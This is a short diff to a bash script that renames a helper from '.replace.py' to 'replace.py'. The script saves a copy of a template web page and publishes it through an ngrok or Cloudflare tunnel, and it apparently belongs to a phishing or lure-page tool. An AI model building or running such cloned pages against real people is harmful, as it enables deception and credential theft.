@@ -218,7 +218,7 @@ checkfound
 elif [[ $option_server -eq 2 ]]; then
 if [[ $templateyn = "y" ]]; then
   .monolith/./monolith $templateurl -o .temp1.html
-  python3 .replace.py > index2.html
+  python3 replace.py > index2.html
 fi
 ngrok_server
 elif [[ $option_server -eq 3 ]]; then
@@ -228,7 +228,7 @@ sleep 2
 start_cloud
 if [[ $templateyn = "y" ]]; then
   .monolith/./monolith $templateurl -o .temp1.html
-  python3 .replace.py > index2.html
+  python3 replace.py > index2.html
 fi
 
 cf=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .server/log.txt)
